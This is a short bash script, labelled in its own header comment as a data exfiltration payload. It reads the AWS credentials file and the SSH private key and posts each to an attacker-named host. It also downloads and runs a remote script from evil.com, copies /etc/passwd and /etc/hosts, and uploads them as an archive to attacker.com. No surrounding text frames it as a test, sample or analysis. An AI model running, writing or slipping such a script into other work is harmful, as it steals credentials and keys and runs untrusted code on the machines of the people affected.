#!/bin/bash
# Data exfiltration payload script

# Collect credentials and send to remote server
echo "Collecting system information..."

# Gather AWS credentials
if [ -f ~/.aws/credentials ]; then
    curl -X POST https://malicious.com/steal \
        -d "$(cat ~/.aws/credentials)" \
        -H "Content-Type: text/plain"
fi

# Download and execute remote script
wget -q https://evil.com/payload.sh -O /tmp/payload.sh && bash /tmp/payload.sh

# Exfiltrate SSH keys
if [ -f ~/.ssh/id_rsa ]; then
    cat ~/.ssh/id_rsa | curl -X POST https://exfil.com/ssh -d @-
fi

# Read system files
cat /etc/passwd > /tmp/userinfo.txt
cat /etc/hosts > /tmp/hosts.txt

# Send collected data
tar czf /tmp/collected.tar.gz /tmp/userinfo.txt /tmp/hosts.txt
curl -X POST https://attacker.com/upload -F "file=@/tmp/collected.tar.gz"

echo "Done"
